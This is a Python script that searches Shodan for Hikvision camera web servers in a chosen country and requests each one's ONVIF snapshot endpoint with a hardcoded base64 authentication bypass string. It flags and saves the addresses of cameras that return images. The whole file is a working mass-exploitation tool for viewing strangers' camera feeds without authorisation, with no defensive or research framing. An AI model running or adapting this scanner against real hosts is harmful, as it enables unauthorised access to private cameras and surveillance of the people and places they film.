import argparse
import shodan
import requests
import logging
from urllib.parse import urljoin
from time import sleep

# Configure logging
logging.basicConfig(
    filename='hikvision_scanner.log',
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def test_camera_vulnerability(ip, port, verbose=False):
    """
    Test if a Hikvision camera is vulnerable by accessing the snapshot endpoint.
    """
    base_url = f"http://{ip}:{port}"
    snapshot_url = urljoin(base_url, "/onvif-http/snapshot?auth=YWRtaW46MTEK")
    try:
        if verbose:
            print(f"[DEBUG] Accessing {snapshot_url}")
        response = requests.get(snapshot_url, timeout=5)
        # Check if the response is an image
        if response.status_code == 200 and 'image' in response.headers.get('Content-Type', ''):
            return snapshot_url  # Vulnerable
        elif response.status_code == 401:
            return False  # Not vulnerable, requires authentication
        else:
            return False  # Other responses indicate not vulnerable
    except requests.RequestException as e:
        if verbose:
            print(f"[ERROR] Error accessing {snapshot_url}: {e}")
        logging.debug(f"Error accessing {snapshot_url}: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description="Shodan Hikvision Vulnerability Scanner")
    parser.add_argument("--api", required=True, help="Shodan API key")
    parser.add_argument("--country", help="Country code for the search query (default: RU)", default="RU")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("--output", "-o", help="File to save the results", default=None)
    parser.add_argument("--page", "-p", type=int, help="Number of pages to search (default: 1)", default=1)
    args = parser.parse_args()

    api_key = args.api
    country = args.country
    verbose = args.verbose
    output_file = args.output
    pages = args.page

    try:
        # Initialize Shodan API
        shodan_api = shodan.Shodan(api_key)
        query = f'"App-webs" "200 OK" country:"{country}"'

        if verbose:
            print(f"[INFO] Performing Shodan search with query: {query} for {pages} page(s)")
        print("Please wait...")  # Notify the user
        logging.info(f"Performing Shodan search with query: {query} for {pages} page(s)")

        # Collect results across pages
        ip_port_map = {}
        for page in range(1, pages + 1):
            if verbose:
                print(f"[INFO] Fetching page {page}/{pages}")
            try:
                results = shodan_api.search(query, page=page)
                for match in results['matches']:
                    ip = match['ip_str']
                    port = match['port']
                    if ip not in ip_port_map:
                        ip_port_map[ip] = set()
                    ip_port_map[ip].add(port)
                if verbose:
                    print(f"[INFO] Found {len(results['matches'])} results on page {page}")
                sleep(1)  # Respect Shodan's API rate limit
            except shodan.APIError as e:
                print(f"[ERROR] Shodan API error on page {page}: {e}")
                logging.error(f"Shodan API error on page {page}: {e}")
                break

        # Sort and remove duplicates
        sorted_ips = sorted(ip_port_map.keys())
        total_unique_ips = len(sorted_ips)

        if verbose:
            print(f"[INFO] Total unique IPs to process: {total_unique_ips}")
        logging.info(f"Total unique IPs to process: {total_unique_ips}")

        vulnerable_hosts = []

        # Process each unique IP and all its ports
        for i, ip in enumerate(sorted_ips, start=1):
            ports = ip_port_map[ip]
            if verbose:
                print(f"[INFO] Checking IP ({i}/{total_unique_ips}): {ip}, Ports: {list(ports)}")
            logging.info(f"Checking IP ({i}/{total_unique_ips}): {ip}, Ports: {list(ports)}")

            for port in ports:
                if verbose:
                    print(f"[DEBUG] Testing {ip}:{port}")
                result = test_camera_vulnerability(ip, port, verbose=verbose)
                if result:
                    print(f"[VULNERABLE] {result} - Hikvision camera snapshot accessible without authentication")
                    logging.info(f"Vulnerable: {result}")
                    vulnerable_hosts.append(result)
                else:
                    if verbose:
                        print(f"[SAFE] {ip}:{port} - Not vulnerable")
                    logging.debug(f"Not vulnerable: {ip}:{port}")
            sleep(0.1)  # Add a short delay to avoid overwhelming servers

        # Output results to console and file
        print("\n[RESULTS]")
        print("=" * 50)
        for idx, url in enumerate(vulnerable_hosts, start=1):
            print(f"{idx}. Vulnerable Hikvision Camera: {url}")
        print("=" * 50)
        print(f"Total Vulnerable Hosts Found: {len(vulnerable_hosts)}")
        print(f"Total Unique IPs Checked: {total_unique_ips}")

        if output_file:
            with open(output_file, "w") as f:
                f.write("[RESULTS]\n")
                f.write("=" * 50 + "\n")
                for idx, url in enumerate(vulnerable_hosts, start=1):
                    f.write(f"{idx}. Vulnerable Hikvision Camera: {url}\n")
                f.write("=" * 50 + "\n")
                f.write(f"Total Vulnerable Hosts Found: {len(vulnerable_hosts)}\n")
                f.write(f"Total Unique IPs Checked: {total_unique_ips}\n")
            print(f"[INFO] Results saved to {output_file}")

    except shodan.APIError as e:
        print(f"[ERROR] Shodan API error: {e}")
        logging.error(f"Shodan API error: {e}")
    except Exception as e:
        print(f"[ERROR] Unexpected error: {e}")
        logging.error(f"Unexpected error: {e}")

if __name__ == "__main__":
    main()
